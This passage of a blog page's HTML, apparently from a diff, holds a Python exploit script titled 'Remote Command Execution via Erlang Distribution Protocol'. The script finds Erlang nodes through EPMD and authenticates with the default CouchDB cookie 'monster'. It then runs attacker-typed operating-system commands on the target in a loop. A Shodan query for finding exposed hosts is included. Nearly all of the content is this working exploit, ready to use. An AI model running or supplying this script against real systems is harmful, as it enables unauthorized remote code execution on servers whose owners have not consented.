class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Remote Command Execution via Erlang Distribution Protocol </span><br><span class="line"># Date: 2022-01-21</span><br><span class="line"># Exploit Author: Konstantin Burov, @_sadshade</span><br><span class="line"># Software Link: https:&#x2F;&#x2F;www.erlang.org&#x2F;doc&#x2F;apps&#x2F;erts&#x2F;erl_dist_protocol.html</span><br><span class="line"># Version: N&#x2F;A</span><br><span class="line"># Tested on: Kali 2021.2</span><br><span class="line"># Based on 1F98D&#39;s Erlang Cookie - Remote Code Execution</span><br><span class="line"># Shodan: port:4369 &quot;name &quot;</span><br><span class="line"># References:</span><br><span class="line">#  https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;49418</span><br><span class="line">#  https:&#x2F;&#x2F;insinuator.net&#x2F;2017&#x2F;10&#x2F;erlang-distribution-rce-and-a-cookie-bruteforcer&#x2F;</span><br><span class="line">#  https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;pentesting&#x2F;4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce</span><br><span class="line"># </span><br><span class="line">#</span><br><span class="line">#!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">from hashlib import md5</span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">TARGET &#x3D; sys.argv[1]</span><br><span class="line">EPMD_PORT &#x3D; int(sys.argv[2]) # Default Erlang distributed port</span><br><span class="line">COOKIE &#x3D; &quot;monster&quot; # Default Erlang cookie for CouchDB </span><br><span class="line">ERLNAG_PORT &#x3D; 0</span><br><span class="line">EPM_NAME_CMD &#x3D; b&quot;\x00\x01\x6e&quot; # Request for nodes list</span><br><span class="line"></span><br><span class="line"># Some data:</span><br><span class="line">NAME_MSG  &#x3D; b&quot;\x00\x15n\x00\x05\x00\x07\x49\x9cAAAAAA@AAAAAAA&quot;</span><br><span class="line">CHALLENGE_REPLY &#x3D; b&quot;\x00\x15r\x01\x02\x03\x04&quot;</span><br><span class="line">CTRL_DATA  &#x3D; b&quot;\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03&quot;</span><br><span class="line">CTRL_DATA +&#x3D; b&quot;\x00\x00\x00\x00\x00w\x00w\x03rex&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def compile_cmd(CMD):</span><br><span class="line">    MSG  &#x3D; b&quot;\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00&quot;</span><br><span class="line">    MSG +&#x3D; b&quot;\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k&quot;</span><br><span class="line">    MSG +&#x3D; struct.pack(&quot;&gt;H&quot;, len(CMD))</span><br><span class="line">    MSG +&#x3D; bytes(CMD, &#39;ascii&#39;)</span><br><span class="line">    MSG +&#x3D; b&#39;jw\x04user&#39;</span><br><span class="line">    PAYLOAD &#x3D; b&#39;\x70&#39; + CTRL_DATA + MSG</span><br><span class="line">    PAYLOAD &#x3D; struct.pack(&#39;!I&#39;, len(PAYLOAD)) + PAYLOAD</span><br><span class="line">    return PAYLOAD</span><br><span class="line"></span><br><span class="line">print(&quot;Remote Command Execution via Erlang Distribution Protocol.\n&quot;)</span><br><span class="line"></span><br><span class="line"># Connect to EPMD:</span><br><span class="line">try:</span><br><span class="line">    epm_socket &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    epm_socket.connect((TARGET, EPMD_PORT))</span><br><span class="line">except socket.error as msg:</span><br><span class="line">    print(&quot;Couldnt connect to EPMD: %s\n terminating program&quot; % msg)</span><br><span class="line">    sys.exit(1)</span><br><span class="line">    </span><br><span class="line">epm_socket.send(EPM_NAME_CMD) #request Erlang nodes</span><br><span class="line">if epm_socket.recv(4) &#x3D;&#x3D; b&#39;\x00\x00\x11\x11&#39;: # OK</span><br><span class="line">    data &#x3D; epm_socket.recv(1024)</span><br><span class="line">    data &#x3D; data[0:len(data) - 1].decode(&#39;ascii&#39;)</span><br><span class="line">    data &#x3D; data.split(&quot;\n&quot;)</span><br><span class="line">    if len(data) &#x3D;&#x3D; 1:</span><br><span class="line">        choise &#x3D; 1</span><br><span class="line">        print(&quot;Found &quot; + data[0])</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;\nMore than one node found, choose which one to use:&quot;)</span><br><span class="line">        line_number &#x3D; 0</span><br><span class="line">        for line in data:</span><br><span class="line">            line_number +&#x3D; 1</span><br><span class="line">            print(&quot; %d) %s&quot; %(line_number, line))</span><br><span class="line">        choise &#x3D; int(input(&quot;\n&gt; &quot;))</span><br><span class="line">        </span><br><span class="line">    ERLNAG_PORT &#x3D; int(re.search(&quot;\d+$&quot;,data[choise - 1])[0])</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Node list request error, exiting&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line">epm_socket.close()</span><br><span class="line"></span><br><span class="line"># Connect to Erlang port:</span><br><span class="line">try:</span><br><span class="line">    s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((TARGET, ERLNAG_PORT))</span><br><span class="line">except socket.error as msg:</span><br><span class="line">    print(&quot;Couldnt connect to Erlang server: %s\n terminating program&quot; % msg)</span><br><span class="line">    sys.exit(1)</span><br><span class="line">   </span><br><span class="line">s.send(NAME_MSG)</span><br><span class="line">s.recv(5)</span><br><span class="line">challenge &#x3D; s.recv(1024)     # Receive &quot;challenge&quot; message</span><br><span class="line">print(challenge)</span><br><span class="line">challenge &#x3D; struct.unpack(&quot;&gt;I&quot;, challenge[9:13])[0]</span><br><span class="line"></span><br><span class="line">#print(&quot;Extracted challenge: &#123;&#125;&quot;.format(challenge))</span><br><span class="line"></span><br><span class="line"># Add Challenge Digest</span><br><span class="line">CHALLENGE_REPLY +&#x3D; md5(bytes(COOKIE, &quot;ascii&quot;)</span><br><span class="line">    + bytes(str(challenge), &quot;ascii&quot;)).digest()</span><br><span class="line">s.send(CHALLENGE_REPLY)</span><br><span class="line">CHALLENGE_RESPONSE &#x3D; s.recv(1024)</span><br><span class="line"></span><br><span class="line">if len(CHALLENGE_RESPONSE) &#x3D;&#x3D; 0:</span><br><span class="line">    print(&quot;Authentication failed, exiting&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line">print(&quot;Authentication successful&quot;)</span><br><span class="line">print(&quot;Enter command:\n&quot;)</span><br><span class="line"></span><br><span class="line">data_size &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    if data_size &lt;&#x3D; 0:</span><br><span class="line">        CMD &#x3D; input(&quot;&gt; &quot;)</span><br><span class="line">        if not CMD:</span><br><span class="line">            continue</span><br><span class="line">        elif CMD &#x3D;&#x3D; &quot;exit&quot;:</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        s.send(compile_cmd(CMD))</span><br><span class="line">        data_size &#x3D; struct.unpack(&quot;&gt;I&quot;, s.recv(4))[0] # Get data size</span><br><span class="line">        s.recv(45)              # Control message</span><br><span class="line">        data_size -&#x3D; 45         # Data size without control message</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">    elif data_size &lt; 1024:        </span><br><span class="line">        data &#x3D; s.recv(data_size)</span><br><span class="line">        #print(&quot;S---data_size: %d, data_recv_size: %d&quot; %(data_size,len(data)))</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        print(data[3:].decode())</span><br><span class="line">        data_size &#x3D; 0</span><br><span class="line">    else:        </span><br><span class="line">        data &#x3D; s.recv(1024)</span><br><span class="line">        #print(&quot;L---data_size: %d, data_recv_size: %d&quot; %(data_size,len(data)))</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        print(data[4:].decode())</span><br><span class="line">        data_size -&#x3D; 1024</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/12/07/dns-dubbo-0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          dns-dubbo-0
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/11/17/celery-coldfusion/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">celery-coldfusion</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
